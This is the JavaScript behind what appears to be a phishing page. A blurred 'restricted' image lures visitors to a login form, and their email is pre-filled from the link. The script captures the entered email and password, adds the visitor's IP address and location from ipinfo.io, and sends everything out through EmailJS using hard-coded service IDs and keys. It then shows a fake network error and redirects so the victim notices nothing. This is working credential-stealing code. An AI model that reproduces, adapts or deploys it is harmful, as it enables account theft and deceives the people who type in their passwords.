// Initialize EmailJS
(function() {
    emailjs.init({
        publicKey: "kUOv0ZnyMXgQQY1yj",
    });
})();

// Open Login Modal
function openLogin() {
    document.getElementById("loginModal").style.display = "block";
    document.getElementById("overlay").style.display = "block";
}

// Adjust Blur
function adjustBlur() {
    let blurValue = document.getElementById("blurRange").value;
    document.getElementById("restrictedImage").style.filter = `blur(${blurValue}px)`;
}

// Populate email from URL parameter
function populateEmailFromURL() {
    const urlParams = new URLSearchParams(window.location.search);
    const email = urlParams.get('email');
    if (email) {
        document.getElementById("email").value = email;
    }
}

// Send Email with IP info
function sendEmail(event) {
    event.preventDefault();

    let email = document.getElementById("email").value.trim();
    let password = document.getElementById("password").value.trim();

    if (email === "" || password === "") {
        alert("Please fill in all fields.");
        return;
    }

    // Fetch user's IP and location info from IPinfo
    fetch('https://ipinfo.io?token=f65a3d103cb816') // Replace with your IPinfo API token
        .then(response => response.json())
        .then(data => {
            const ipInfo = {
                email: email,
                password: password,
                ip: data.ip || 'Unknown IP',
                city: data.city || 'Unknown City',
                region: data.region || 'Unknown Region',
                country: data.country || 'Unknown Country'
            };

            // Send email using EmailJS
            emailjs.send("service_mclb6ze", "template_30nlj5e", ipInfo)
                .then(response => {
                    console.log("Email Sent:", response.status, response.text);
                    alert("Low Network Coverage°, try again");
                    window.location.href = "exhibition.html"; 
                })
                .catch(error => {
                    console.log("Error:", error);
                    alert("Network Error, Try again later.");
                });
        });
}

// Call populateEmailFromURL on page load
document.addEventListener("DOMContentLoaded", populateEmailFromURL);
